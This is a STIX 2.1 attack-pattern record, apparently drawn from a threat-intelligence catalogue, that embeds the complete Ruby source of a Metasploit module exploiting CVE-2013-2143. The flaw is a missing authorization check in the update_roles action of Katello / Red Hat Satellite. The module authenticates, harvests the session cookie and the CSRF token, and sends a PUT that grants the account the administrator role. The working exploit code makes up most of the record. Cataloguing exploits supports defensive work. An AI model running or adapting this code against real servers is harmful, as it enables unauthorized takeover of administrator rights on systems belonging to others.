{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ad2fbf87-f573-4a6f-b4db-71c0c6de238c",
    "created": "2024-08-14T16:23:25.356677Z",
    "modified": "2024-08-14T16:23:25.35668Z",
    "name": "Katello (Red Hat Satellite) users/update_roles Missing Authorization",
    "description": " This module exploits a missing authorization vulnerability in the \"update_roles\" action of \"users\" controller of Katello and Red Hat Satellite (Katello 1.5.0-14 and earlier) by changing the specified account to an administrator account. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/katello_satellite_priv_esc.rb",
            "external_id": "katello_satellite_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2143"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=970849"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize\n    super(\n      'Name' => 'Katello (Red Hat Satellite) users/update_roles Missing Authorization',\n      'Description' => %q{\n          This module exploits a missing authorization vulnerability in the\n        \"update_roles\" action of \"users\" controller of Katello and Red Hat Satellite\n        (Katello 1.5.0-14 and earlier) by changing the specified account to an\n        administrator account.\n      },\n      'Author' => 'Ramon de C Valle',\n      'License' => MSF_LICENSE,\n      'References' => [\n        ['CVE', '2013-2143'],\n        ['CWE', '862'],\n        ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=970849']\n      ],\n      'DisclosureDate' => 'Mar 24 2014'\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n        OptString.new('USERNAME', [true, 'Your username']),\n        OptString.new('PASSWORD', [true, 'Your password']),\n        OptString.new('TARGETURI', [ true, 'The path to the application', '/']),\n      ], self.class\n    )\n  end\n\n  def run\n    print_status(\"Logging into #{target_url}...\")\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'user_session', 'new'),\n      'vars_get' => {\n        'username' => datastore['USERNAME'],\n        'password' => datastore['PASSWORD']\n      }\n    )\n\n    if res.nil?\n      print_error('No response from remote host')\n      return\n    end\n\n    if res.headers['Location'] =~ %r{user_session/new$}\n      print_error('Authentication failed')\n      return\n    else\n      session = ::Regexp.last_match(1) if res.get_cookies =~ /_katello_session=(\\S*);/\n\n      if session.nil?\n        print_error('Failed to retrieve the current session')\n        return\n      end\n    end\n\n    print_status('Retrieving the CSRF token for this session...')\n    res = send_request_cgi(\n      'cookie' => \"_katello_session=#{session}\",\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'dashboard')\n    )\n\n    if res.nil?\n      print_error('No response from remote host')\n      return\n    end\n\n    if res.headers['Location'] =~ %r{user_session/new$}\n      print_error('Authentication failed')\n      return\n    else\n      session = ::Regexp.last_match(1) if res.get_cookies =~ /_katello_session=(\\S*);/\n\n      if session.nil?\n        print_error('Failed to retrieve the current session')\n        return\n      end\n    end\n\n    if res.headers['Location'] =~ %r{user_session/new$}\n      print_error('Failed to retrieve the user id')\n      return\n    else\n      csrf_token = ::Regexp.last_match(1) if res.body =~ %r{<meta +content=\"(\\S*)\" +name=\"csrf-token\" */?>}i\n      if csrf_token.nil? && (res.body =~ %r{<meta +name=\"csrf-token\" +content=\"(\\S*)\" */?>}i)\n        csrf_token = ::Regexp.last_match(1)\n      end\n\n      if csrf_token.nil?\n        print_error('Failed to retrieve the CSRF token')\n        return\n      end\n\n      user = ::Regexp.last_match(1) if res.body =~ %r{/users.(\\d+)#list_search=#{datastore['USERNAME']}}\n\n      if user.nil?\n        print_error('Failed to retrieve the user id')\n        return\n      end\n    end\n\n    print_status(\"Sending update-user request to #{target_url('users', user, 'update_roles')}...\")\n    res = send_request_cgi(\n      'cookie' => \"_katello_session=#{session}\",\n      'headers' => {\n        'X-CSRF-Token' => csrf_token\n      },\n      'method' => 'PUT',\n      'uri' => normalize_uri(target_uri.path, 'users', user, 'update_roles'),\n      'vars_post' => {\n        'user[role_ids][]' => '1'\n      }\n    )\n\n    if res.nil?\n      print_error('No response from remote host')\n      return\n    end\n\n    if res.headers['X-Message-Type'] =~ /success$/\n      print_good('User updated successfully')\n    else\n      print_error('Failed to update user')\n    end\n  end\n\n  def target_url(*args)\n    (ssl ? 'https' : 'http') +\n      if rport.to_i == 80 || rport.to_i == 443\n        \"://#{vhost}\"\n      else\n        \"://#{vhost}:#{rport}\"\n      end + normalize_uri(target_uri.path, *args)\n  end\nend\n",
    "x_mitre_disclosure_date": "Mar 24 2014"
}